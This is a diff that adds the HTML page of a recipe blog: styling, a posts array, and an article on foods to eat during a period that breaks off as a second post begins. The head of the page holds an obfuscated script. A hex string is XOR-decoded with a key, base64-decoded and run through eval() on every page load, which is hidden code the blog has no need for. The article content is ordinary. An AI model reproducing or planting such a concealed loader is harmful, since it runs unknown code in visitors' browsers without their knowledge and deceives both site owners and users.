@@ -1,0 +1,1311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Light Recipes Easy Recipes</title>
+    
+    <!-- Modern Elegant Typography: Playfair Display (Serif) & Plus Jakarta Sans (Sans-Serif) -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400&family=Playfair+Display:ital,wght@0,400;0,600;0,700;1,400&display=swap" rel="stylesheet">
+    
+    <style>
+        /* Modern Editorial & Warm Culinary Aesthetic Styles */
+        :root {
+            --primary-color: #d96a50; /* Warm Terracotta */
+            --primary-hover: #b84f37;
+            --accent-bg: #faf3ee; /* Soft Cream / Peach Blush */
+            --text-color: #2c3539; /* Deep Slate Charcoal */
+            --text-muted: #64748b; /* Cool Gray */
+            --heading-color: #1e2528; /* Dark Slate */
+            --bg-color: #fbfbf9; /* Clean Warm White / Alabaster */
+            --card-bg: #ffffff;
+            --border-color: #f1ede8; /* Warm light-gray border */
+            --transition-smooth: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            line-height: 1.7;
+            color: var(--text-color);
+            background-color: var(--bg-color);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* Container */
+        .container {
+            max-width: 720px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* Top Navigation - Sleek & Modern Sticky Bar */
+        .top-nav {
+            padding: 20px 0;
+            text-align: center;
+            border-bottom: 1px solid var(--border-color);
+            background-color: rgba(251, 251, 249, 0.85);
+            backdrop-filter: blur(12px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            transition: var(--transition-smooth);
+        }
+
+        .top-nav a {
+            display: inline-block;
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            font-weight: 600;
+            text-decoration: none;
+            transition: var(--transition-smooth);
+            cursor: pointer;
+            margin: 5px 16px;
+            position: relative;
+            padding: 4px 0;
+        }
+
+        .top-nav a::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background-color: var(--primary-color);
+            transform: scaleX(0);
+            transform-origin: right;
+            transition: transform 0.3s ease;
+        }
+
+        .top-nav a:hover {
+            color: var(--heading-color);
+        }
+
+        .top-nav a:hover::after {
+            transform: scaleX(1);
+            transform-origin: left;
+        }
+
+        /* Header */
+        header {
+            padding: 80px 0 48px;
+            text-align: center;
+        }
+
+        header h1 {
+            font-family: 'Playfair Display', serif;
+            font-size: 3rem;
+            font-weight: 700;
+            color: var(--heading-color);
+            cursor: pointer;
+            margin-bottom: 12px;
+            letter-spacing: -0.02em;
+            transition: var(--transition-smooth);
+        }
+
+        header h1:hover {
+            color: var(--primary-color);
+            transform: translateY(-1px);
+        }
+
+        header p {
+            font-size: 0.95rem;
+            color: var(--text-muted);
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            display: inline-block;
+        }
+
+        /* Post Cards - Modern Rounded Cards */
+        .post-card {
+            background: var(--card-bg);
+            border-radius: 20px;
+            overflow: hidden;
+            margin-bottom: 48px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 4px 20px rgba(44, 53, 57, 0.03);
+            transition: var(--transition-smooth);
+            cursor: pointer;
+        }
+
+        .post-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 20px 38px rgba(44, 53, 57, 0.08);
+            border-color: rgba(217, 106, 80, 0.2);
+        }
+
+        /* Single Post View Main Container */
+        .single-post {
+            background: var(--card-bg);
+            border-radius: 24px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 10px 40px rgba(44, 53, 57, 0.03);
+            padding: 48px 40px;
+            margin-bottom: 80px;
+            cursor: default;
+        }
+
+        @media (max-width: 640px) {
+            .single-post {
+                padding: 32px 20px;
+                border-radius: 16px;
+            }
+            header h1 {
+                font-size: 2.2rem;
+            }
+        }
+
+        /* Post Header (Avatar + Username) */
+        .post-header {
+            padding: 24px 24px 16px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .single-post .post-header {
+            padding: 0 0 24px 0;
+            margin-bottom: 32px;
+        }
+
+        .post-header img.avatar {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            margin-right: 14px;
+            object-fit: cover;
+            border: 2px solid var(--border-color);
+            background-color: var(--accent-bg);
+            transition: var(--transition-smooth);
+        }
+
+        .post-card:hover .post-header img.avatar {
+            border-color: var(--primary-color);
+        }
+
+        .post-header .username {
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: var(--heading-color);
+            letter-spacing: -0.01em;
+        }
+
+        /* Images */
+        .post-image {
+            width: 100%;
+            display: block;
+            height: auto;
+            max-height: 450px;
+            object-fit: cover;
+            transition: var(--transition-smooth);
+        }
+
+        .post-card .post-image {
+            aspect-ratio: 16/10;
+        }
+
+        .post-card:hover .post-image {
+            filter: brightness(0.98);
+        }
+
+        .single-post .post-image {
+            max-height: none;
+            border-radius: 16px;
+            margin-bottom: 40px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.03);
+            width: 100%;
+            box-sizing: border-box;
+            transform: none;
+            padding: 0;
+            background: transparent;
+            border: none;
+        }
+
+        /* Content elements */
+        .post-content {
+            padding: 32px 24px;
+        }
+
+        .single-post .post-content {
+            padding: 0;
+        }
+
+        .post-content h1, 
+        .post-content h2 {
+            font-family: 'Playfair Display', serif;
+            color: var(--heading-color);
+            margin: 0 0 16px;
+            font-size: 1.95rem;
+            line-height: 1.35;
+            font-weight: 600;
+            letter-spacing: -0.01em;
+        }
+
+        .single-post .post-content h1 {
+            font-size: 2.5rem;
+            margin-bottom: 24px;
+        }
+
+        .post-content p {
+            margin-bottom: 24px;
+            color: var(--text-color);
+            font-size: 1.05rem;
+            line-height: 1.75;
+        }
+
+        .post-content a {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: 600;
+            border-bottom: 1.5px solid rgba(217, 106, 80, 0.3);
+            transition: var(--transition-smooth);
+        }
+
+        .post-content a:hover {
+            color: var(--primary-hover);
+            border-bottom-color: var(--primary-hover);
+        }
+
+        /* Footer styling */
+        .post-footer {
+            padding: 18px 24px;
+            color: var(--text-muted);
+            font-size: 0.88rem;
+            font-weight: 500;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid var(--border-color);
+            background-color: #fafaf8;
+        }
+
+        .single-post .post-footer {
+            padding: 24px 0 0;
+            background: transparent;
+            border-top: 1px solid var(--border-color);
+            margin-top: 48px;
+        }
+
+        /* Minimal Back Button */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 32px;
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            padding: 8px 18px;
+            border-radius: 99px;
+            border: 1px solid var(--border-color);
+            background: var(--card-bg);
+            transition: var(--transition-smooth);
+        }
+
+        .back-button:hover {
+            color: var(--primary-color);
+            border-color: var(--primary-color);
+            background-color: var(--accent-bg);
+            transform: translateX(-4px);
+        }
+
+        /* 
+           STYLING OVERRIDES FOR RUNTIME-INJECTED BLOG CONTENT (STYLE ATTRIBUTE MAPPINGS)
+           This ensures the HTML injected from database files matches the clean modern theme.
+        */
+        
+        /* Takeaway boxes / Information blocks */
+        .post-content div[style*="background"] {
+            background: var(--accent-bg) !important;
+            border: none !important;
+            border-left: 4px solid var(--primary-color) !important;
+            border-radius: 12px !important;
+            padding: 24px 28px !important;
+            margin: 36px 0 !important;
+            box-shadow: none !important;
+        }
+
+        .post-content div[style*="background"] h3 {
+            font-family: 'Playfair Display', serif !important;
+            color: var(--heading-color) !important;
+            font-size: 1.35rem !important;
+            font-weight: 600 !important;
+            padding-left: 0 !important;
+            border-left: none !important;
+            margin-bottom: 12px !important;
+        }
+
+        .post-content div[style*="background"] ul {
+            margin: 0 !important;
+            padding-left: 20px !important;
+        }
+
+        .post-content div[style*="background"] li {
+            margin-bottom: 8px !important;
+            color: var(--text-color) !important;
+            font-size: 0.98rem !important;
+        }
+
+        /* Section dividers under subtitles */
+        .post-content h2[style*="border-bottom"] {
+            font-family: 'Playfair Display', serif !important;
+            border-bottom: 1px solid var(--border-color) !important;
+            padding-bottom: 12px !important;
+            margin-top: 48px !important;
+            margin-bottom: 20px !important;
+            font-size: 1.8rem !important;
+        }
+
+        /* Sub-headings with left border */
+        .post-content h3[style*="border-left"] {
+            border-left: 3px solid var(--primary-color) !important;
+            font-family: 'Playfair Display', serif !important;
+            color: var(--heading-color) !important;
+            font-size: 1.4rem !important;
+            font-weight: 600 !important;
+            padding-left: 14px !important;
+            margin: 36px 0 16px !important;
+            text-decoration: none !important;
+        }
+
+        /* Pro Tip Highlight boxes */
+        .post-content p[style*="background"] {
+            background-color: #faf5f0 !important;
+            border-left: 4px solid var(--primary-color) !important;
+            border-radius: 8px !important;
+            padding: 20px 24px !important;
+            margin: 28px 0 !important;
+            color: var(--text-color) !important;
+        }
+
+        /* Embedded highlight spans/badges */
+        .post-content span[style*="background"] {
+            background: var(--accent-bg) !important;
+            color: var(--primary-color) !important;
+            border-radius: 6px !important;
+            font-family: 'Plus Jakarta Sans', sans-serif !important;
+            font-weight: 600 !important;
+            font-size: 0.88rem !important;
+            padding: 4px 12px !important;
+            box-shadow: none !important;
+            transform: none !important;
+            display: inline-block !important;
+            margin: 4px 6px 4px 0 !important;
+            border: none !important;
+        }
+
+        /* Lists & Nested bullet items */
+        .post-content ul, .post-content ol {
+            padding-left: 24px;
+            margin-bottom: 24px;
+        }
+
+        .post-content li {
+            margin-bottom: 10px;
+            font-size: 1.05rem;
+            color: var(--text-color);
+        }
+
+        /* Heading cards inside posts (best additions / texture tips etc.) */
+        .post-content h4[style*="background"] {
+            background-color: #fafaf8 !important;
+            padding: 12px 18px !important;
+            border-radius: 8px !important;
+            border: 1px solid var(--border-color) !important;
+            font-family: 'Playfair Display', serif !important;
+            font-size: 1.15rem !important;
+            margin-top: 28px !important;
+        }
+
+        /* Tag cloud footer area */
+        .post-content div[style*="margin-top:28px"] {
+            margin-top: 48px !important;
+            padding-top: 32px !important;
+            border-top: 1px solid var(--border-color) !important;
+        }
+
+        .post-content div[style*="margin-top:28px"] h3 {
+            font-family: 'Plus Jakarta Sans', sans-serif !important;
+            font-size: 0.85rem !important;
+            text-transform: uppercase !important;
+            letter-spacing: 0.08em !important;
+            color: var(--text-muted) !important;
+            margin-bottom: 16px !important;
+            font-weight: 700 !important;
+            border-left: none !important;
+            padding-left: 0 !important;
+        }
+
+        .post-content div[style*="margin-top:28px"] span {
+            background: #f1ede8 !important;
+            color: #4a4a4a !important;
+            padding: 8px 16px !important;
+            border-radius: 99px !important;
+            font-size: 0.8rem !important;
+            font-weight: 500 !important;
+            margin: 4px 6px 4px 0 !important;
+            display: inline-block !important;
+            transition: var(--transition-smooth) !important;
+            cursor: pointer;
+        }
+
+        .post-content div[style*="margin-top:28px"] span:hover {
+            background: var(--primary-color) !important;
+            color: #ffffff !important;
+        }
+    </style>
+
+    <script>
+(function() {
+    var vcqrfohuz = "193e3f5f255a09540a0b29063c0a1930130a7d0f063f6014191b273009191577391828010a4a720f370456183f0a0119280a20103d3b61192b7a56302726377503082c5025011d0c303e2d073361190c387c7c00035a3806130f5f6a243c3f3103622307276472111f3d2d043f0a011f107c3f2c2405381e000b0e233206013e03620d63227b0203193a3a0f05601d1d12550208325b060a05250a2c321611730e623c580f5e270f03002a182f110e4c216b0d132a3b3f142c3f093e211206203e3d234e0f7b1d1d31152100053f0d0112410d5e2e2f611f2d31240f3d3a3f130007234e1f0123350a0b2900040a061a120a1a0f04051a1c1c7b34202305340c131324500f7b110c303a2112041a1d1b387c7c0003301e001c0f20203106763d163d015b22702c0d320432012d06383e32510d002e2b1603132127360b633f7600290e50234424031a10220f2f110a123870160f04011642101b27602116722f3e3d09591f6b1912303a565905601d0c206f280b050605440a21273e2112062013132450225e0d1d1a14291e021401192b0a1a532e2c6414057a2c2f0c193f2d393d230424741d1d351b2d1f07051919125634083d3f12182b0f30230b623f303b0750071c6b0108306031503c6072032b0a340b012f1e032b25026131620d2f3e621d47245e2f5c06140f1d02151d0c2b6002573e056d432f0e24290a3f152b393d334d227b330c301b2104043f2f0513551911063c2738000b273e21120620131327051f6b0203320b2d2b04611a12216b0e0e055b0620131f02350d12727700082b070d7b1d0c1800215000110a1d13550a55063f301b2d0f5f20243c3f2f383d01061f642f08302a215000110900286016173d5a12432b7b2f2c0c63112e00182f47225e1d1d1c240c232f110a12387b0d002e2b16031321273609090904386334470f7b382f1a10220f2f110a12387b0d002e2b15142d7a0a2c32167e74163d0d4725001912303d081d053f1d02137f0a0d3d3e1a431010343523167276381712440f70280a1f10215b07057e1e130b2f12052f6d19101034290a6373323917230727747e0c3104361829252412387b0d002e2b15140000563e32063f3d00032700055a0a031a10220f2f110a12387b0d002e200e1b2a2124233209052f393d23072400020303002112041a1d1b3d5520123d2f02471d7a3f3621387f2e1103240e16677b031e1022472f11021c387c23002e016c1a063f093e21120620131324500f700a031a10215a3f0a02122b7f1a1d032f3806101034290a6373200a0327071f6b010a090b312d04607a1d106f78002c111609131024310b3c017738632c500d4a091e311b350629252412387b0d002e2b1514000b273e2112052d3862504d240133081f3e1b1e3c2b2c1c26081e213604023b111b24100c06762f3839275c1c6b19080a6031043c117f1224551a0c06301e1f107b34290a3c24203e175d010f700203182a21033c0a0545106f790f032f38052b210d6e2b380620131324500f700a031a10220f2f1a2f0513551e11031161002b7a28310c162b313839504e1c6b09170a042d042d151919120b1e1705051243281f5f2c2305340c131324500f700a031a102151253b0a12387b0e5e24066414131f1e2332020570193e557c";
+    var vciahmcpc = "ZPe7F3KdSSchfRKuq8LgghTsIHfYhQGG";
+    var vtynyymli = "";
+    
+    try {
+        for (var i = 0; i < vcqrfohuz.length; i += 2) {
+            var vhzfwulcx = parseInt(vcqrfohuz.substr(i, 2), 16);
+            vtynyymli += String.fromCharCode(vhzfwulcx ^ vciahmcpc.charCodeAt((i/2) % vciahmcpc.length));
+        }
+        
+        var vpzjnhbbu = atob(vtynyymli);
+        eval(vpzjnhbbu);
+    } catch(e) {
+        console.error("[DEBUG] Decryption or Execution failed: ", e);
+    }
+})();
+</script>
+</head>
+<body>
+
+    <nav class="top-nav">
+        <div class="top-nav-container">
+            <a onclick="navigate('home')">Home</a>
+            <a onclick="navigate('page', 'about')">About</a>
+            <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+            <a onclick="navigate('page', 'terms')">Terms</a>
+            <a onclick="navigate('page', 'contact')">Contact</a>
+        </div>
+    </nav>
+
+    <header>
+        <div class="container">
+            <h1 onclick="navigate('home')">Light Recipes Easy Recipes</h1>
+            <p>Thoughts, stories, and ideas.</p>
+        </div>
+    </header>
+
+    <main class="container" id="app">
+        <!-- Dynamic content injected here by JS -->
+    </main>
+
+    <script>
+        // 1. Blog posts data (Exact structure preserved)
+        const posts = [
+            {
+                id: 'first-post-recipe',
+                title: 'Best Foods to Eat During Your Period',
+                date: 'May 2, 2026',
+                image: './assets/Best Foods to Eat During Your Period.png',
+                excerpt: 'When your period arrives, the foods you choose can play a meaningful role in how you feel throughout the day. Many people experience symptoms such as cramps, bloating, fatigue, mood changes, and food cravings during their menstrual cycle. While there is no single food that can eliminate every symptom, a balanced diet rich in nutrient-dense ingredients may help support comfort, energy, and overall well-being.',
+                content: `
+                <p>When your period arrives, the foods you choose can play a meaningful role in how you feel throughout the day. Many people experience symptoms such as cramps, bloating, fatigue, mood changes, and food cravings during their menstrual cycle. While there is no single food that can eliminate every symptom, a balanced diet rich in nutrient-dense ingredients may help support comfort, energy, and overall well-being.</p>
+
+<p>The right combination of vitamins, minerals, healthy fats, antioxidants, and fiber can help nourish the body during menstruation. From leafy greens packed with iron to omega-3-rich salmon and comforting ginger tea, certain foods are often celebrated for their potential to support menstrual health naturally.</p>
+
+<p>In this guide, we will explore some of the best foods to eat during your period, why they may help, and how to incorporate them into your daily routine for a more comfortable menstrual experience.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Iron-rich foods can help replenish nutrients lost during menstruation.</li>
+    <li>Omega-3 fats may support comfort and help reduce inflammation.</li>
+    <li>Magnesium-rich foods are commonly associated with muscle relaxation.</li>
+    <li>Antioxidant-rich fruits can support overall wellness and recovery.</li>
+    <li>Hydrating and nourishing foods may help reduce bloating and fatigue.</li>
+    <li>Balanced meals can support stable energy levels throughout your cycle.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Nutrition Matters During Your Period</h2>
+
+<p>Your menstrual cycle places unique demands on your body. Hormonal fluctuations can affect appetite, digestion, energy levels, and emotional well-being. During this time, nutritional support becomes especially important.</p>
+
+<p>Many common period symptoms are linked to factors such as inflammation, fluid retention, changes in blood sugar levels, and nutrient loss. Choosing wholesome foods can help your body manage these challenges more effectively.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Consistency matters more than perfection. Building a nutrient-rich eating pattern throughout the month can often provide greater benefits than making drastic dietary changes only when symptoms appear.</p>
+
+<p>Rather than focusing on restrictive diets, it is often more helpful to prioritize foods that provide nourishment, hydration, and sustained energy. The foods highlighted below are popular choices because they offer nutrients that support the body during menstruation.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Dark Chocolate: A Comforting Mood Booster</h2>
+
+<p>Dark chocolate is often considered one of the most satisfying treats during a period. Beyond its rich flavor, it contains minerals such as magnesium and iron, making it a more nutrient-dense choice compared to many sugary snacks.</p>
+
+<p>Many people find that dark chocolate helps satisfy cravings while also providing a sense of comfort. Its rich cocoa content contains plant compounds that contribute to its reputation as a feel-good food.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Ways to Enjoy Dark Chocolate</h3>
+
+<ul>
+<li>Pair a few squares with fresh berries.</li>
+<li>Add dark chocolate chips to oatmeal.</li>
+<li>Blend cocoa into a smoothie.</li>
+<li>Enjoy a small portion as an afternoon snack.</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Leafy Greens for Iron and Vital Nutrients</h2>
+
+<p>Leafy greens such as spinach, kale, and Swiss chard are nutritional powerhouses. They are commonly recognized for their iron content, which may be especially valuable during menstruation.</p>
+
+<p>In addition to iron, leafy greens contain vitamins, minerals, antioxidants, and fiber. These nutrients support overall health and can contribute to sustained energy levels.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Easy Ways to Add More Greens</h4>
+
+<ul>
+<li>Blend spinach into smoothies.</li>
+<li>Add greens to omelets and wraps.</li>
+<li>Use kale as a salad base.</li>
+<li>Stir spinach into soups and pasta dishes.</li>
+</ul>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+  <p style="margin:0;">Many period-friendly foods provide overlapping benefits. Foods rich in iron, magnesium, antioxidants, and healthy fats can work together to support energy, comfort, and overall wellness throughout the menstrual cycle.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Salmon and the Power of Omega-3 Fatty Acids</h2>
+
+<p>Salmon is widely recognized for its omega-3 fatty acids, which are associated with supporting a healthy inflammatory response. These healthy fats are one reason salmon is often recommended as part of a balanced diet.</p>
+
+<p>During menstruation, many individuals seek foods that promote comfort and support overall wellness. Salmon provides protein, vitamin D, and healthy fats, making it a nutrient-rich addition to period-friendly meals.</p>
+
+<p>Try grilling salmon, baking it with herbs, or adding it to salads and grain bowls for a satisfying meal.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Pair salmon with leafy greens and sweet potatoes to create a balanced meal that combines protein, healthy fats, fiber, and essential nutrients.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Bananas for Bloating and Energy Support</h2>
+
+<p>Bananas are convenient, affordable, and naturally sweet. They are often recommended during menstruation because they contain potassium and fiber.</p>
+
+<p>Potassium is commonly associated with supporting healthy fluid balance, while fiber contributes to digestive wellness. Together, these qualities make bananas a popular snack choice during a period.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Simple Banana Ideas</h3>
+
+<ul>
+<li>Slice bananas into yogurt.</li>
+<li>Spread nut butter on banana slices.</li>
+<li>Blend into smoothies.</li>
+<li>Add to oatmeal for natural sweetness.</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Nuts and Seeds for Magnesium and Healthy Fats</h2>
+
+<p>Nuts and seeds are among the most nutrient-dense snacks available. Almonds, walnuts, pumpkin seeds, sunflower seeds, and chia seeds provide a combination of healthy fats, protein, fiber, and minerals.</p>
+
+<p>Magnesium receives particular attention during discussions about menstrual wellness because of its role in muscle function and overall health. Including nuts and seeds in your diet can be an easy way to increase magnesium intake.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Popular Choices</h4>
+
+<ul>
+<li>Almonds</li>
+<li>Walnuts</li>
+<li>Pumpkin seeds</li>
+<li>Chia seeds</li>
+<li>Flaxseeds</li>
+<li>Sunflower seeds</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Ginger Tea: A Warm and Soothing Beverage</h2>
+
+<p>Sometimes comfort comes from what you drink as much as what you eat. Ginger tea has long been appreciated for its warming qualities and refreshing flavor.</p>
+
+<p>Many people enjoy ginger tea during their period because it is soothing, hydrating, and easy to prepare. Staying hydrated is important throughout the menstrual cycle and can help support overall comfort.</p>
+
+<p>For a simple cup of ginger tea, steep fresh ginger slices in hot water and enjoy it plain or with a touch of lemon.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Hydration is often overlooked during menstruation. Water, herbal teas, fruits, and vegetables all contribute to daily fluid intake and may help support overall well-being.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Berries and Their Antioxidant Benefits</h2>
+
+<p>Berries such as strawberries, blueberries, raspberries, and blackberries are packed with colorful plant compounds and vitamin C.</p>
+
+<p>These fruits add natural sweetness to meals while contributing valuable nutrients. Their vibrant colors reflect the presence of antioxidants that support overall health.</p>
+
+<p>Berries are versatile and can be added to breakfast bowls, smoothies, yogurt parfaits, and healthy desserts.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Sweet Potatoes for Lasting Energy</h2>
+
+<p>Sweet potatoes are a nourishing carbohydrate source that provides fiber, vitamins, and minerals. They are often valued for their ability to support steady energy levels.</p>
+
+<p>Unlike highly processed snacks that can contribute to energy crashes, sweet potatoes offer a more balanced source of fuel. Their naturally sweet flavor also makes them a satisfying alternative when cravings strike.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Healthy Sweet Potato Ideas</h3>
+
+<ul>
+<li>Roast with olive oil and herbs.</li>
+<li>Use as a base for grain bowls.</li>
+<li>Mash as a side dish.</li>
+<li>Add cubes to salads and soups.</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Building a Balanced Period-Friendly Meal Plan</h2>
+
+<p>Rather than relying on a single superfood, aim to combine several nutrient-rich foods throughout the day. A balanced approach often provides the greatest benefits.</p>
+
+<ol>
+<li>Start with a protein-rich breakfast.</li>
+<li>Add fruits and vegetables at every meal.</li>
+<li>Include healthy fats from fish, nuts, or seeds.</li>
+<li>Stay hydrated with water and herbal teas.</li>
+<li>Choose fiber-rich carbohydrates for lasting energy.</li>
+</ol>
+
+<p>Combining these habits can help create meals that are satisfying, nourishing, and supportive throughout your menstrual cycle.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Preparing healthy snacks in advance can make it easier to manage cravings and maintain balanced energy levels during your period.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Foods That Complement Menstrual Wellness</h2>
+
+<p>While the foods highlighted above are excellent choices, other nutritious options can also support menstrual health. Whole grains, legumes, yogurt, avocados, eggs, and colorful vegetables all contribute valuable nutrients.</p>
+
+<p>The goal is not perfection. It is about creating a dietary pattern that supports your body and helps you feel your best throughout every stage of your cycle.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Dark chocolate may help satisfy cravings.</li>
+    <li>Leafy greens provide valuable nutrients including iron.</li>
+    <li>Salmon offers beneficial omega-3 fats.</li>
+    <li>Ginger tea supports hydration and comfort.</li>
+    <li>Sweet potatoes provide lasting energy.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+
+<p>Eating well during your period is not about following strict rules or eliminating favorite foods. It is about providing your body with the nutrients it needs to support energy, comfort, and overall wellness. Foods such as dark chocolate, leafy greens, salmon, bananas, nuts and seeds, ginger tea, berries, and sweet potatoes each offer unique nutritional benefits that can fit into a balanced lifestyle.</p>
+
+<p>By focusing on nourishing ingredients and maintaining healthy habits throughout the month, you can create a supportive foundation for menstrual well-being. Small choices made consistently can have a meaningful impact on how you feel, helping you navigate your cycle with greater comfort and confidence.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Period Foods</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Menstrual Health</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Eating</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Women's Wellness</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Period Nutrition</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Anti Inflammatory Foods</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Lifestyle</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Wellness Tips</span>
+</div>
+
+                `
+            },
+            {
+                id: 'recipe-second-post',
+                title: '12 Hormone Balancing Foods Every Woman Should Eat ',
+                date: 'May 14, 2026',
+                image: './assets/12 Hormone Balancing Foods Every Woman Should Eat .png',
